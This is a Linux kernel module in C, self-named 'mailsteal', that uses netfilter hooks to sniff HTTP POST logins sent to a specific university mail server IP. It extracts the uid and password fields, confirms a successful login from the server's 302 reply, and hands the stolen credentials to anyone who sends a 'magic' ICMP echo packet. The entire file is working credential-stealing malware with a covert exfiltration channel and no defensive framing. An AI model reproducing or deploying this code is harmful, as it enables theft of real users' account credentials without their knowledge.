#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

MODULE_LICENSE("GPL");

#define ICMP_PAYLOAD_SIZE (htons(ip_hdr(sb)->tot_len) - sizeof(struct iphdr) - sizeof(struct icmphdr))

#define MAGIC_CODE 0x5B
#define REPLY_SIZE 36

static char *uid = NULL;
static char *pwd = NULL;
static int have_pair = 0;//用于标志是否抓取到密码
static int flag = 0;//用于标志是否是正确的密码

/* Used to describe our Netfilter hooks */
struct nf_hook_ops pre_hook;  /* Incoming: watch_in_icmp*/
struct nf_hook_ops post_hook; /* Outgoing: watch_out_http */
struct nf_hook_ops in_hook; /* input: watch_in_http*/



u_long change_uint(u_long a, u_long b, u_long c, u_long d){
    u_long address = 0;
    address |= d<<24;
    address |= c<<16;
    address |= b<<8;
    address |= a;
    return address;
};

/*
    获取uid/pwd
*/
char *get_login_info(char *data, char *pattern)
{
    char *start = NULL;
    char *end = NULL;
    char *info = NULL;
    if ((start = strstr(data, pattern)) == NULL)
        return info;
    start = start + strlen(pattern);
    if ((end = strchr(start, '&')) == NULL)
        return info;
    info = kmalloc(end - start + 1, GFP_KERNEL);
    if (info == NULL)
        return info;
    memset(info, '\0', end - start + 1);
    memcpy(info, start, end - start);
    return info;

}

/*
    检查向外发出的包是否是POST请求包，如果是，则抓取uid&pwd
*/
static void check_out_http(struct sk_buff *skb)
{


    struct tcphdr *tcp = NULL;
    char *http_data = NULL;
    int http_len = 0;
    int i=0;
    tcp = (struct tcphdr *)(skb->data + (ip_hdr(skb)->ihl * 4));
    http_len = ntohs(ip_hdr(skb)->tot_len) - ip_hdr(skb)->ihl * 4 - tcp->doff * 4;


    http_data = (char*)kmalloc(http_len+1, GFP_KERNEL);
    if(http_data==NULL) 
	return;
    memset(http_data, 0x00, http_len+1);

    /*申请内存之后，需用struct sk_buff中的data指针向http_data，不能用memcpy，会造成死机，原因不详*/
    for(;i<http_len;i++){
	    http_data[i] = skb->data[i+ip_hdr(skb)->ihl * 4 + tcp->doff * 4];
    }
    http_data[http_len]='\0';

    /* 首先判断是否为post请求包*/
    if(strncmp(http_data,"POST ",5)!=0)
    {
        return ;
    }

    /*如果已经保存了一对正确的uid&pwd且未向远端发送uid&pwd，则不必再更新uid&pwd*/
    if(flag == 0){
    	uid = get_login_info(http_data, "&uid=");
    	pwd = get_login_info(http_data, "&password=");
	    if((uid!='\0')&&(pwd!='\0'))
	    {   
		    printk(KERN_INFO "uid:%s pwd:%s\n", uid, pwd);
            have_pair = 1;
        }
    }
    kfree(http_data); 
    http_data = NULL;
}

/* Function called as the POST_ROUTING (last) hook. It will check for
 * FTP traffic then search that traffic for USER and PASS commands. */
static unsigned int watch_out_http(unsigned int hooknum,
                              struct sk_buff *skb,
                              const struct net_device *in,
                              const struct net_device *out,
                              int (*okfn)(struct sk_buff *))
{
    
    struct sk_buff *sb=skb;
    struct tcphdr *tcp;

    /* Make sure this is a TCP packet first */
    if (ip_hdr(sb)->protocol != IPPROTO_TCP)
        return NF_ACCEPT; /* Nope, not TCP */

    tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));

    /*判断是否为HTTP报文*/
    if (tcp->dest != htons(80))
        return NF_ACCEPT; /* Nope, not HTTP */
                          // if (!uid && !pwd)

  /*判断是否发往"202.38.64.8"（科大邮箱ip）的报文*/
    if(ip_hdr(sb)->daddr!=change_uint(202,38,64,8)){
        //printk("1111\n");
        return NF_ACCEPT;
    }

    check_out_http(sb);
    //kfree(sb);
    /* We are finished with the packet, let it go on its way */
    return NF_ACCEPT;
}

/* Procedure that watches incoming ICMP traffic for the "Magic" packet.
 * When that is received, we tweak the skb structure to send a reply
 * back to the requesting host and tell Netfilter that we stole the
 * packet. */
static unsigned int watch_in_icmp(unsigned int hooknum,
                             struct sk_buff *skb,
                             const struct net_device *in,
                             const struct net_device *out,
                             int (*okfn)(struct sk_buff *))
{
    struct sk_buff *sb = skb;
    struct icmphdr *icmp;
    char *cp_data;      /* Where we copy data to in reply */
    unsigned int taddr; /* Temporary IP holder */

    /* Do we even have a username/password pair to report yet? */
    if (!uid && !pwd)
        return NF_ACCEPT;

    /* Is this an ICMP packet? */
    if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;

    icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4);

    /* Is it the MAGIC packet? */
    if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO || ICMP_PAYLOAD_SIZE < REPLY_SIZE)
    {
        return NF_ACCEPT;
    }

    /* Okay, matches our checks for "Magicness", now we fiddle with
    * the sk_buff to insert the IP address, and username/password pair,
    * swap IP source and destination addresses and ethernet addresses
    * if necessary and then transmit the packet from here and tell
    * Netfilter we stole it. Phew... */
    taddr = ip_hdr(sb)->saddr;
    ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
    ip_hdr(sb)->daddr = taddr;

    sb->pkt_type = PACKET_OUTGOING;

    switch (sb->dev->type)
    {
        case ARPHRD_PPP: /* Ntcho iddling needs doing */
            break;
        case ARPHRD_LOOPBACK:
        case ARPHRD_ETHER:
        {
            unsigned char t_hwaddr[ETH_ALEN];

            /* Move the data pointer to point to the link layer header */
            sb->data = (unsigned char *)eth_hdr(sb);
            sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
            memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
            memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),ETH_ALEN);
            memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
            break;
        }
    };
    if(flag == 1){//如果存在一对正确的uid和pwd，则拷贝到icmp包中
        /* Now copy the IP address, then Username, then password into packet */
        cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
        memcpy(cp_data, uid, strlen(uid) + 1);
        memcpy(cp_data + 20, pwd, strlen(pwd) + 1);
        /* This is where things will die if they are going to.
        * Fingers crossed... */

        dev_queue_xmit(sb);

        /* Now free the saved username and password and reset have_pair */
        kfree(uid);
        kfree(pwd);
        uid = NULL;
        pwd = NULL;
        have_pair = 0;//重置标志位
        flag=0;
        return NF_STOLEN;
    }
	dev_queue_xmit(sb);
    return NF_STOLEN;
}

static unsigned int watch_in_http(unsigned int hooknum,
                             struct sk_buff *skb,
                             const struct net_device *in,
                             const struct net_device *out,
                             int (*okfn)(struct sk_buff *))
{

    struct tcphdr *tcp = NULL;
    char *http_data = NULL;
    int http_len = 0;
    //char *data=NULL;
    int i=0;

    /* Make sure this is a TCP packet first */
    if (ip_hdr(skb)->protocol != IPPROTO_TCP)
        return NF_ACCEPT; /* Nope, not TCP */

     /*判断原地址"202.38.64.8"（科大邮箱ip）的报文，该钩子函数注册在INPUT链中,不必再判断目的地址是否是本主机*/
    if(ip_hdr(skb)->saddr!=change_uint(202,38,64,8)){
        //printk("1111\n");
        return NF_ACCEPT;
    }

    tcp = (struct tcphdr *)(skb->data + (ip_hdr(skb)->ihl * 4));
    http_len = ntohs(ip_hdr(skb)->tot_len) - ip_hdr(skb)->ihl * 4 - tcp->doff * 4;


    http_data = (char*)kmalloc(http_len+1, GFP_KERNEL);
    if(http_data==NULL) 
	return NF_ACCEPT;
    memset(http_data, 0x00, http_len+1);
    for(;i<http_len;i++){
	    http_data[i] = skb->data[i+ip_hdr(skb)->ihl * 4 + tcp->doff * 4];
    }
    http_data[http_len]='\0';

    //HTTP/1 .1 302   data[0]='H'
    if(have_pair==1&&strncmp(http_data+9,"302",3)==0)
    	flag=1;/*窃取到正确的uid&pwd对，flag赋为１*/

    kfree(http_data);
    http_data=NULL;
    return NF_ACCEPT;
}


int init_module()
{
    /*向PREROUTING链中注册watch_in_icmp钩子函数*/
    pre_hook.hook = (nf_hookfn*)watch_in_icmp;
    pre_hook.pf = PF_INET;
    pre_hook.priority = NF_IP_PRI_FIRST;
    pre_hook.hooknum = NF_INET_PRE_ROUTING;
    /*向POSTROUTING链中注册watch_out_http钩子函数*/
    post_hook.hook = (nf_hookfn*)watch_out_http;
    post_hook.pf = PF_INET;
    post_hook.priority = NF_IP_PRI_FIRST;
    post_hook.hooknum = NF_INET_POST_ROUTING;
    /*向INPUT链中注册watch_in_http钩子函数*/
    in_hook.hook = (nf_hookfn*)watch_in_http;
    in_hook.pf = PF_INET;
    in_hook.priority = NF_IP_PRI_FIRST;
    in_hook.hooknum = NF_INET_LOCAL_IN;

    nf_register_hook(&pre_hook);
    nf_register_hook(&post_hook);
    nf_register_hook(&in_hook);
    printk(KERN_INFO "Insert mailsteal module!\n");
    return 0;
}

void cleanup_module()
{
    nf_unregister_hook(&post_hook);
    nf_unregister_hook(&pre_hook);
    nf_unregister_hook(&in_hook);
    if (pwd)
        kfree(pwd);
    if (uid)
        kfree(uid);
    printk(KERN_INFO "Goodbye!\n");
}
